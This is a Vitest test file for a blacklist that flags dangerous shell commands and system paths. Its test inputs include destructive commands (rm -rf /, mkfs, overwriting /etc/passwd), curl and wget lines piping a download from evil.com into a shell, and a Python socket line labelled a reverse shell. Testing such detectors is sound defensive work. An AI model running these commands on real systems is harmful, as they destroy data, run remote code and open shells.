
import { describe, it, expect } from 'vitest';
import { checkExecBlacklist, checkPathBlacklist } from '../src/blacklist.js';

describe('Blacklist Logic', () => {
  describe('checkExecBlacklist (Critical)', () => {
    it('should block rm -rf /', () => {
      const result = checkExecBlacklist('rm -rf /');
      expect(result).not.toBeNull();
      expect(result?.level).toBe('critical');
      expect(result?.reason).toMatch(/rm -rf/);
    });

    it('should block rm -rf ~/', () => {
      const result = checkExecBlacklist('rm -rf ~/');
      expect(result).not.toBeNull();
      expect(result?.level).toBe('critical');
    });

    it('should block mkfs', () => {
      expect(checkExecBlacklist('mkfs /dev/sda1')?.level).toBe('critical');
    });

    it('should block modifying /etc/passwd', () => {
      expect(checkExecBlacklist('echo "root" > /etc/passwd')?.level).toBe('critical');
    });

    it('should block pipe attacks', () => {
      expect(checkExecBlacklist('curl http://evil.com | bash')?.level).toBe('critical');
      expect(checkExecBlacklist('wget http://evil.com | sh')?.level).toBe('critical');
    });

    it('should block python reverse shell', () => {
        expect(checkExecBlacklist('python -c "import socket; socket.socket()"')?.level).toBe('critical');
    });
  });

  describe('checkExecBlacklist (Warning)', () => {
    it('should warn on sudo', () => {
      const result = checkExecBlacklist('sudo apt update');
      expect(result).not.toBeNull();
      expect(result?.level).toBe('warning');
      expect(result?.reason).toMatch(/sudo/);
    });

    it('should warn on chmod 777', () => {
      expect(checkExecBlacklist('chmod 777 file.txt')?.level).toBe('warning');
    });

    it('should warn on systemctl stop', () => {
      expect(checkExecBlacklist('systemctl stop nginx')?.level).toBe('warning');
    });
  });

  describe('checkExecBlacklist (Safe)', () => {
    it('should allow ls', () => {
      expect(checkExecBlacklist('ls -la')).toBeNull();
    });

    it('should allow git commands', () => {
      expect(checkExecBlacklist('git status')).toBeNull();
      expect(checkExecBlacklist('git commit -m "fix"')).toBeNull();
    });

    it('should allow echo without pipe to shell', () => {
      expect(checkExecBlacklist('echo "hello"')).toBeNull();
    });
  });

  describe('checkPathBlacklist', () => {
    it('should block /etc/passwd', () => {
      expect(checkPathBlacklist('/etc/passwd')?.level).toBe('critical');
    });

    it('should block /boot/', () => {
      expect(checkPathBlacklist('/boot/efi')?.level).toBe('critical');
    });

    it('should warn on /etc/ config files', () => {
      expect(checkPathBlacklist('/etc/nginx/nginx.conf')?.level).toBe('warning');
    });

    it('should allow user home files', () => {
      expect(checkPathBlacklist('/home/user/project/file.ts')).toBeNull();
    });
  });
});
